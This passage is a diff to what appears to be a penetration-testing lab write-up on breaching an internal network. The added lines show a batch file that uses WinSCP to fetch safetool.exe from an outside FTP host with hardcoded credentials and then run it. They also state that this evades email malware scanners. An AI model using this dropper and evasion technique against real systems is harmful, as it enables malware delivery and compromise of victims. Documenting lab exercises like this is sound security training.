@@ -49,17 +49,28 @@ The Support Department
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/7bf68f95-ffd8-459b-bd48-98c878ab8ef8)
 
+To create the batch file, I opened the command prompt and entered "notepad c:\Users\jaime\Downloads\trythis.bat". This command opened Notepad and created a new file in the specified directory.
+
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/735bbd9d-b7c4-4e4f-9556-e571d16902fa)
+
+Notepad pops up, and I am asked if I would like to create the new file. I select, Yes.
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/c15b5d52-9417-4c60-b72d-b8bc93f2a1fd)
 
+I then typed the following lines of code into Notepad:
+
 "C:\Program Files (x86)\WinSCP\winscp" /ini=nul /command "open ftp://svcsupport:Pa$$w0rd@203.0.113.66/ -hostkey=open" "get safetool.exe %userprofile%\Downloads\" "exit"
 
-%userprofile%\Downloads\safetool.exe
+"%userprofile%\Downloads\safetool.exe"
+
+These commands facilitate the download and execution of the exploit file on the victim's system. The strategic use of a basic batch file is effective in circumventing malware scanners that may otherwise detect and remove the exploit from an email.
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/44a81139-5023-4440-aacb-15c752b6a1fe)
 
-![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/41e8a85b-cf6b-46f9-b5c5-cb276b24c147)
+I saved the 
+
+![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/7e793e40-644a-4982-8ca9-2a57a5981999)
+
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/b8b53073-7666-4ce2-afcc-84719bd5b36b)
 
